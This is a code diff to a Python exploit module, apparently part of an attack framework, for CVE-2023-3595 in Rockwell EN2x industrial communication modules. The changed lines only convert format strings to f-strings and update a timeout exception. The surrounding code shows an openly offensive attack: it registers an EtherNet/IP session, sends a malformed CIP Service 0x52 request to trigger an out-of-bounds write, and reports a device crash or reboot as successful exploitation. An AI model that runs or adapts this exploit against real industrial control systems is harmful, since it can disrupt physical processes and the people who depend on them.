@@ -70,7 +70,7 @@ class Exploit(Exploit):
             print_info("PoC reference: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-191a")
             return
 
-        print_status("[CVE-2023-3595] Targeting {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2023-3595] Targeting {self.target}:{self.port} ...")
 
         # ── Phase 1: EtherNet/IP RegisterSession ─────────────────────────
         # EIP command 0x0065 — RegisterSession
@@ -98,9 +98,9 @@ class Exploit(Exploit):
                 sock.close()
                 return
             session_handle = struct.unpack_from("<I", resp, 4)[0]
-            print_success("[CVE-2023-3595] Session registered: 0x{:08X}".format(session_handle))
+            print_success(f"[CVE-2023-3595] Session registered: 0x{session_handle:08X}")
         except Exception as exc:
-            print_error("[CVE-2023-3595] Connection failed: {}".format(exc))
+            print_error(f"[CVE-2023-3595] Connection failed: {exc}")
             return
 
         # ── Phase 2: SendRRData with malformed CIP Service 0x52 ──────────
@@ -154,12 +154,12 @@ class Exploit(Exploit):
                 elif status == 0x00000008:
                     print_warning("[CVE-2023-3595] CIP error 0x08 (not found) — module may be patched or path wrong")
                 else:
-                    print_info("[CVE-2023-3595] CIP response status: 0x{:08X}".format(status))
+                    print_info(f"[CVE-2023-3595] CIP response status: 0x{status:08X}")
                     print_success("[CVE-2023-3595] Payload delivered — check if EN2x rebooted (sign of successful corruption)")
-            except socket.timeout:
+            except TimeoutError:
                 print_success("[CVE-2023-3595] No response after OOB write — EN2x may have crashed/rebooted (exploitation indicator)")
         except Exception as exc:
-            print_error("[CVE-2023-3595] SendRRData failed: {}".format(exc))
+            print_error(f"[CVE-2023-3595] SendRRData failed: {exc}")
         finally:
             try:
                 sock.close()
